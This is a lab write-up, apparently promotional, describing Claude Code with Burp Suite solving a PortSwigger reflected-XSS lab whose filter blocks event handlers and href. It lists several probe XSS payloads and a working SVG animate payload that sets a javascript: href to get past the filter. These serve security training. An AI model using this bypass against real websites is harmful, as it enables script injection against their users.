# Example: Reflected XSS with Event Handlers and href Attributes Blocked

## PortSwigger Lab Solved with Claude Code + Burp Suite

This is a real-world example of how this setup was used to solve an Expert-level XSS lab on PortSwigger Web Security Academy.

---

## Context

**Lab:** Reflected XSS with event handlers and `href` attributes blocked
**Objective:** Execute `alert(1)` by exploiting a reflected XSS with a WAF that blocks event handlers and the href attribute.

## Workflow

### 1. Initial Reconnaissance

Claude Code was asked to navigate to the lab and take a snapshot:

```
Navigate to https://[LAB-ID].web-security-academy.net/ and analyze the page
```

Claude automatically identified:
- A blog with search functionality
- A `search` GET parameter that reflects user input inside an `<h1>` tag

### 2. WAF Enumeration with Burp

Claude sent test requests via Burp Suite to map the WAF rules:

| Payload | WAF Response |
|---------|--------------|
| `<img src=x onerror=alert(1)>` | `"Tag is not allowed"` |
| `<body onload=alert(1)>` | `"Tag is not allowed"` |
| `<svg onload=alert(1)>` | `"Event is not allowed"` |
| `<a href="javascript:alert(1)">` | `"Attribute is not allowed"` |
| `<svg>` | **200 OK - Tag allowed** |

### 3. Exploit Development

Using the WAF intel, Claude crafted a payload using SVG `<animate>` to dynamically inject `href`:

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

**Why it works:**
- `<svg>`, `<a>`, `<animate>`, and `<text>` are all allowed tags
- The WAF blocks `href` as a direct attribute, but `<animate attributeName=href>` sets it dynamically at render time via SMIL animation
- The WAF doesn't detect this as an `href` attribute since it's a value inside `attributeName`

### 4. Verification

Claude navigated to the URL with the payload using Chrome DevTools and confirmed the lab was marked as **Solved**.

## Prompt Used

```
Solve this PortSwigger lab: Reflected XSS with event handlers and href
attributes blocked. URL: https://[LAB-ID].web-security-academy.net/
Use Burp to test payloads and Chrome to verify.
```

## Total Time: ~2 minutes

The entire process (reconnaissance, WAF enumeration, payload development, and verification) was completed by Claude Code autonomously in approximately 2 minutes.
